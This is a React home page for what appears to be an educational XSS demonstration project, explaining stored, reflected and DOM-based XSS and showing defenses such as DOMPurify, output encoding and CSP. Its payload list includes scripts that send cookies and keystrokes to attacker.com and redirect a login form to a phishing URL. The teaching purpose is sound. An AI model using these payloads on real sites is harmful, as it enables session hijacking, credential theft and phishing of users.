import { Link } from 'react-router-dom';
import {
  HiShieldExclamation,
  HiDatabase,
  HiSearch,
  HiCode,
  HiArrowRight,
  HiExclamation,
} from 'react-icons/hi';
import { FaSkullCrossbones, FaShieldAlt } from 'react-icons/fa';
import CodeBlock from '../components/CodeBlock';
import { useTheme } from '../context/ThemeContext';

const xssTypes = [
  {
    title: 'Stored XSS',
    icon: <HiDatabase className="w-7 h-7" />,
    color: 'from-red-500 to-orange-500',
    border: 'border-red-500/30',
    bg: 'bg-red-500/5',
    description:
      'Malicious scripts are permanently stored on the target server (e.g., in a database). When victims view the stored content, the script executes in their browser.',
    example: 'Comment boards, user profiles, forum posts',
    link: '/stored-xss/vulnerable',
  },
  {
    title: 'Reflected XSS',
    icon: <HiSearch className="w-7 h-7" />,
    color: 'from-orange-500 to-yellow-500',
    border: 'border-orange-500/30',
    bg: 'bg-orange-500/5',
    description:
      'The malicious script is reflected off a web server in error messages, search results, or any response that includes input sent to the server as part of the request.',
    example: 'Search pages, error pages, URL parameters',
    link: '/reflected-xss/vulnerable',
  },
  {
    title: 'DOM-based XSS',
    icon: <HiCode className="w-7 h-7" />,
    color: 'from-purple-500 to-blue-500',
    border: 'border-purple-500/30',
    bg: 'bg-purple-500/5',
    description:
      'The vulnerability exists in client-side code rather than server-side. The attack payload is executed as a result of modifying the DOM environment in the victim\'s browser.',
    example: 'URL fragments, client-side routing, innerHTML usage',
    link: '/dom-xss/vulnerable',
  },
];

const commonPayloads = [
  {
    title: 'Basic Script Injection',
    code: `<script>alert('XSS')</script>`,
    description: 'The simplest XSS payload — injects a script tag directly.',
  },
  {
    title: 'Image Tag with Event Handler',
    code: `<img src=x onerror="alert('XSS')">`,
    description: 'Uses a broken image source to trigger the onerror event handler.',
  },
  {
    title: 'SVG-based XSS',
    code: `<svg onload="alert('XSS')">`,
    description: 'SVG elements support inline event handlers that execute JavaScript.',
  },
  {
    title: 'Cookie Theft',
    code: `<script>
  new Image().src = "https://attacker.com/steal?cookie="
    + document.cookie;
</script>`,
    description: 'Exfiltrates session cookies to an attacker-controlled server.',
  },
  {
    title: 'Keylogger Injection',
    code: `<script>
  document.addEventListener('keypress', function(e) {
    new Image().src = "https://attacker.com/log?key=" + e.key;
  });
</script>`,
    description: 'Captures every keystroke and sends it to the attacker.',
  },
  {
    title: 'DOM Manipulation',
    code: `<script>
  document.getElementById('login-form')
    .action = 'https://attacker.com/phish';
</script>`,
    description: 'Redirects form submissions to a phishing server.',
  },
];

const workflowSteps = [
  { num: 1, title: 'Identify', desc: 'Find input fields and URL parameters that reflect user input' },
  { num: 2, title: 'Inject', desc: 'Craft XSS payload and submit through the vulnerable input' },
  { num: 3, title: 'Execute', desc: 'Malicious script runs in victim\'s browser context' },
  { num: 4, title: 'Mitigate', desc: 'Apply sanitization, CSP, and encoding to prevent attacks' },
];

export default function Home() {
  const { dark } = useTheme();

  return (
    <div>
      {/* ═══ Hero Section ═══ */}
      <section className="gradient-hero relative overflow-hidden">
        <div className={`absolute inset-0 ${dark ? 'bg-[radial-gradient(ellipse_at_top,rgba(249,115,22,0.08),transparent_70%)]' : 'bg-[radial-gradient(ellipse_at_top,rgba(249,115,22,0.12),transparent_70%)]'}`} />
        <div className="relative max-w-6xl mx-auto px-4 py-24 text-center">
          <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full border border-primary-500/30 bg-primary-500/10 ${dark ? 'text-primary-400' : 'text-primary-600'} text-sm font-medium mb-8">
            <HiShieldExclamation className="w-4 h-4" />
            Information Security Research Project
          </div>

          <h1 className={`text-4xl sm:text-5xl lg:text-6xl font-bold mb-6 leading-tight ${dark ? 'text-white' : 'text-gray-900'}`}>
            Cross-Site Scripting
            <br />
            <span className="bg-gradient-to-r from-primary-400 to-primary-600 bg-clip-text text-transparent">
              (XSS) Attack Demonstration
            </span>
          </h1>

          <p className={`text-lg max-w-3xl mx-auto mb-10 leading-relaxed ${dark ? 'text-dark-400' : 'text-gray-600'}`}>
            A comprehensive study of XSS vulnerabilities in web applications, demonstrating
            all three attack types — Stored, Reflected, and DOM-based — with both vulnerable
            and secure implementations for educational purposes.
          </p>

          <div className="flex flex-wrap gap-4 justify-center">
            <a
              href="#overview"
              className="px-7 py-3 bg-primary-500 hover:bg-primary-600 text-white font-semibold rounded-xl transition-colors flex items-center gap-2"
            >
              Explore Project <HiArrowRight className="w-4 h-4" />
            </a>
            <Link
              to="/stored-xss/vulnerable"
              className={`px-7 py-3 border rounded-xl transition-colors ${dark ? 'border-dark-600 hover:border-dark-500 text-white hover:bg-dark-800' : 'border-gray-300 hover:border-gray-400 text-gray-700 hover:bg-gray-100'}`}
            >
              Try Demo
            </Link>
          </div>
        </div>
      </section>

      {/* ═══ What is XSS? ═══ */}
      <section className={`py-20 ${dark ? 'bg-dark-950' : 'bg-gray-50'}`}>
        <div className="max-w-6xl mx-auto px-4">
          <div className={`rounded-2xl p-8 md:p-12 border ${dark ? 'bg-dark-800 border-dark-700' : 'bg-white border-gray-200 shadow-sm'}`}>
            <div className="flex items-start gap-4 mb-6">
              <div className="w-12 h-12 rounded-xl bg-primary-500/20 flex items-center justify-center shrink-0">
                <HiExclamation className="w-6 h-6 text-primary-400" />
              </div>
              <div>
                <h2 className={`text-2xl font-bold mb-2 ${dark ? 'text-white' : 'text-gray-900'}`}>What is Cross-Site Scripting (XSS)?</h2>
              </div>
            </div>
            <div className={`space-y-4 leading-relaxed ${dark ? 'text-dark-300' : 'text-gray-600'}`}>
              <p>
                <strong className={dark ? 'text-white' : 'text-gray-900'}>Cross-Site Scripting (XSS)</strong> is a type of security vulnerability
                typically found in web applications. It allows attackers to inject malicious client-side scripts into
                web pages viewed by other users. XSS attacks occur when an application includes untrusted data in a
                web page without proper validation or escaping.
              </p>
              <p>
                The injected scripts execute in the context of the victim's browser session, giving attackers the
                ability to steal session tokens, cookies, redirect users to malicious sites, deface web content,
                capture keystrokes, and perform actions on behalf of the user.
              </p>
              <p>
                XSS is consistently ranked in the <strong className={dark ? 'text-primary-400' : 'text-primary-600'}>OWASP Top 10</strong> list
                of the most critical web application security risks, making it one of the most prevalent and dangerous
                web vulnerabilities.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* ═══ Project Overview ═══ */}
      <section id="overview" className={`py-20 ${dark ? 'bg-dark-900/50' : 'bg-white'}`}>
        <div className="max-w-6xl mx-auto px-4">
          <h2 className={`text-3xl font-bold text-center mb-4 ${dark ? 'text-white' : 'text-gray-900'}`}>Project Overview</h2>
          <p className={`text-center max-w-2xl mx-auto mb-12 ${dark ? 'text-dark-400' : 'text-gray-600'}`}>
            Explore the three types of XSS attacks with interactive demos showing both vulnerable and 
            secure implementations
          </p>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {xssTypes.map((type) => (
              <Link
                key={type.title}
                to={type.link}
                className={`block p-6 rounded-2xl border ${type.border} ${type.bg} hover:scale-[1.02] transition-all duration-200 group`}
              >
                <div className={`w-14 h-14 rounded-xl bg-gradient-to-br ${type.color} flex items-center justify-center text-white mb-5`}>
                  {type.icon}
                </div>
                <h3 className={`text-xl font-bold mb-3 group-hover:text-primary-400 transition-colors ${dark ? 'text-white' : 'text-gray-900'}`}>
                  {type.title}
                </h3>
                <p className={`text-sm leading-relaxed mb-4 ${dark ? 'text-dark-400' : 'text-gray-600'}`}>
                  {type.description}
                </p>
                <p className={`text-xs ${dark ? 'text-dark-500' : 'text-gray-500'}`}>
                  <strong className={dark ? 'text-dark-400' : 'text-gray-700'}>Examples:</strong> {type.example}
                </p>
                <div className={`mt-4 ${dark ? 'text-primary-400' : 'text-primary-600'} text-sm font-medium flex items-center gap-1 group-hover:gap-2 transition-all`}>
                  Try Demo <HiArrowRight className="w-4 h-4" />
                </div>
              </Link>
            ))}
          </div>
        </div>
      </section>

      {/* ═══ About This Project ═══ */}
      <section className={`py-20 ${dark ? 'bg-dark-950' : 'bg-gray-50'}`}>
        <div className="max-w-6xl mx-auto px-4">
          <div className={`rounded-2xl p-8 md:p-12 border ${dark ? 'bg-gradient-to-r from-dark-800 to-dark-800/50 border-dark-700' : 'bg-white border-gray-200 shadow-sm'}`}>
            <h2 className={`text-2xl font-bold mb-4 ${dark ? 'text-white' : 'text-gray-900'}`}>About This Project</h2>
            <div className={`space-y-4 leading-relaxed ${dark ? 'text-dark-300' : 'text-gray-600'}`}>
              <p>
                This project explores Cross-Site Scripting (XSS) vulnerabilities in web applications. By building
                intentionally vulnerable components alongside secure versions, we demonstrate how these attacks
                work and how to protect against them.
              </p>
              <p>
                Each demo includes <strong className={dark ? 'text-red-400' : 'text-red-600'}>a vulnerable version</strong> with no input
                sanitization or output encoding (making it susceptible to XSS attacks) and{' '}
                <strong className={dark ? 'text-green-400' : 'text-green-600'}>a secure version</strong> that implements proper defenses
                including input validation, output encoding, DOMPurify sanitization, and Content Security Policies.
              </p>
              <p>
                Through this hands-on approach, we gain practical insights into client-side security challenges
                and best practices for building secure web applications.
              </p>
            </div>

            {/* Tech stack badges */}
            <div className="flex flex-wrap gap-3 mt-6">
              {['React', 'Tailwind CSS', 'Node.js', 'Express', 'DOMPurify', 'Vite'].map((tech) => (
                <span key={tech} className={`px-3 py-1.5 text-xs font-medium rounded-lg border ${dark ? 'bg-dark-700 text-dark-300 border-dark-600' : 'bg-gray-100 text-gray-600 border-gray-200'}`}>
                  {tech}
                </span>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* ═══ Workflow ═══ */}
      <section className={`py-20 ${dark ? 'bg-dark-950' : 'bg-gray-50'}`}>
        <div className="max-w-6xl mx-auto px-4">
          <h2 className={`text-3xl font-bold text-center mb-12 ${dark ? 'text-white' : 'text-gray-900'}`}>Attack Workflow</h2>
          <div className={`rounded-2xl p-8 border ${dark ? 'bg-dark-800 border-dark-700' : 'bg-white border-gray-200 shadow-sm'}`}>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8">
              {workflowSteps.map((step) => (
                <div key={step.num} className="text-center">
                  <div className="w-14 h-14 mx-auto mb-4 bg-primary-500 rounded-full flex items-center justify-center text-white text-xl font-bold">
                    {step.num}
                  </div>
                  <h3 className="text-lg font-bold ${dark ? 'text-primary-400' : 'text-primary-600'} mb-2">{step.title}</h3>
                  <p className={`text-sm leading-relaxed ${dark ? 'text-dark-400' : 'text-gray-600'}`}>{step.desc}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* ═══ XSS Techniques & Code Snippets ═══ */}
      <section className={`py-20 ${dark ? 'bg-dark-900/50' : 'bg-white'}`}>
        <div className="max-w-6xl mx-auto px-4">
          <h2 className={`text-3xl font-bold text-center mb-4 ${dark ? 'text-white' : 'text-gray-900'}`}>Common XSS Techniques</h2>
          <p className={`text-center max-w-2xl mx-auto mb-12 ${dark ? 'text-dark-400' : 'text-gray-600'}`}>
            These are commonly used XSS payloads that attackers use to exploit vulnerable web applications
          </p>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {commonPayloads.map((payload) => (
              <div key={payload.title} className={`rounded-2xl overflow-hidden border ${dark ? 'bg-dark-800 border-dark-700' : 'bg-white border-gray-200 shadow-sm'}`}>
                <div className={`p-5 border-b ${dark ? 'border-dark-700' : 'border-gray-200'}`}>
                  <h3 className={`text-lg font-bold mb-1 ${dark ? 'text-white' : 'text-gray-900'}`}>{payload.title}</h3>
                  <p className={`text-sm ${dark ? 'text-dark-400' : 'text-gray-600'}`}>{payload.description}</p>
                </div>
                <CodeBlock code={payload.code} variant="danger" />
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ═══ Defense Techniques ═══ */}
      <section className={`py-20 ${dark ? 'bg-dark-950' : 'bg-gray-50'}`}>
        <div className="max-w-6xl mx-auto px-4">
          <h2 className={`text-3xl font-bold text-center mb-4 ${dark ? 'text-white' : 'text-gray-900'}`}>Defense Mechanisms</h2>
          <p className={`text-center max-w-2xl mx-auto mb-12 ${dark ? 'text-dark-400' : 'text-gray-600'}`}>
            Key techniques used to prevent XSS attacks in web applications
          </p>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <div className={`rounded-2xl overflow-hidden border ${dark ? 'bg-dark-800 border-green-900/30' : 'bg-white border-green-200 shadow-sm'}`}>
              <div className={`p-5 border-b ${dark ? 'border-dark-700' : 'border-gray-200'}`}>
                <h3 className="text-lg font-bold ${dark ? 'text-green-400' : 'text-green-600'} mb-1">Input Sanitization (DOMPurify)</h3>
                <p className={`text-sm ${dark ? 'text-dark-400' : 'text-gray-600'}`}>Remove dangerous HTML tags and attributes before rendering</p>
              </div>
              <CodeBlock
                code={`import DOMPurify from 'dompurify';

// Sanitize user input before rendering
const clean = DOMPurify.sanitize(userInput);

// Safe to render
element.innerHTML = clean;`}
                variant="success"
              />
            </div>

            <div className={`rounded-2xl overflow-hidden border ${dark ? 'bg-dark-800 border-green-900/30' : 'bg-white border-green-200 shadow-sm'}`}>
              <div className={`p-5 border-b ${dark ? 'border-dark-700' : 'border-gray-200'}`}>
                <h3 className="text-lg font-bold ${dark ? 'text-green-400' : 'text-green-600'} mb-1">Output Encoding</h3>
                <p className={`text-sm ${dark ? 'text-dark-400' : 'text-gray-600'}`}>Encode special characters so they display as text, not code</p>
              </div>
              <CodeBlock
                code={`function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}`}
                variant="success"
              />
            </div>

            <div className={`rounded-2xl overflow-hidden border ${dark ? 'bg-dark-800 border-green-900/30' : 'bg-white border-green-200 shadow-sm'}`}>
              <div className={`p-5 border-b ${dark ? 'border-dark-700' : 'border-gray-200'}`}>
                <h3 className="text-lg font-bold ${dark ? 'text-green-400' : 'text-green-600'} mb-1">Content Security Policy (CSP)</h3>
                <p className={`text-sm ${dark ? 'text-dark-400' : 'text-gray-600'}`}>HTTP header that restricts script execution sources</p>
              </div>
              <CodeBlock
                code={`// Express middleware using Helmet
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],  // Only allow same-origin scripts
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:"],
  }
}));`}
                variant="success"
              />
            </div>

            <div className={`rounded-2xl overflow-hidden border ${dark ? 'bg-dark-800 border-green-900/30' : 'bg-white border-green-200 shadow-sm'}`}>
              <div className={`p-5 border-b ${dark ? 'border-dark-700' : 'border-gray-200'}`}>
                <h3 className="text-lg font-bold ${dark ? 'text-green-400' : 'text-green-600'} mb-1">Use textContent instead of innerHTML</h3>
                <p className={`text-sm ${dark ? 'text-dark-400' : 'text-gray-600'}`}>Prevent DOM XSS by using safe DOM APIs</p>
              </div>
              <CodeBlock
                code={`// ❌ VULNERABLE - parses HTML
element.innerHTML = userInput;

// ✅ SAFE - treats as plain text
element.textContent = userInput;

// ✅ SAFE - React's default behavior
<div>{userInput}</div>  // auto-escaped`}
                variant="success"
              />
            </div>
          </div>
        </div>
      </section>

      {/* ═══ CTA ═══ */}
      <section className={`py-20 ${dark ? 'bg-dark-900/50' : 'bg-white'}`}>
        <div className="max-w-4xl mx-auto px-4 text-center">
          <h2 className={`text-3xl font-bold mb-4 ${dark ? 'text-white' : 'text-gray-900'}`}>Ready to Explore?</h2>
          <p className={`mb-8 max-w-xl mx-auto ${dark ? 'text-dark-400' : 'text-gray-600'}`}>
            Try the interactive demos to see XSS attacks in action and learn how to defend against them
          </p>
          <div className="flex flex-wrap gap-4 justify-center">
            <Link
              to="/stored-xss/vulnerable"
              className={`px-6 py-3 bg-red-500/10 border border-red-500/30 ${dark ? 'text-red-400' : 'text-red-600'} rounded-xl hover:bg-red-500/20 transition-colors font-medium`}
            >
              <HiShieldExclamation className="inline mr-2 w-5 h-5" />
              Stored XSS Demo
            </Link>
            <Link
              to="/reflected-xss/vulnerable"
              className={`px-6 py-3 bg-orange-500/10 border border-orange-500/30 ${dark ? 'text-orange-400' : 'text-orange-600'} rounded-xl hover:bg-orange-500/20 transition-colors font-medium`}
            >
              <HiSearch className="inline mr-2 w-5 h-5" />
              Reflected XSS Demo
            </Link>
            <Link
              to="/dom-xss/vulnerable"
              className={`px-6 py-3 bg-purple-500/10 border border-purple-500/30 ${dark ? 'text-purple-400' : 'text-purple-600'} rounded-xl hover:bg-purple-500/20 transition-colors font-medium`}
            >
              <HiCode className="inline mr-2 w-5 h-5" />
              DOM XSS Demo
            </Link>
          </div>
        </div>
      </section>
    </div>
  );
}
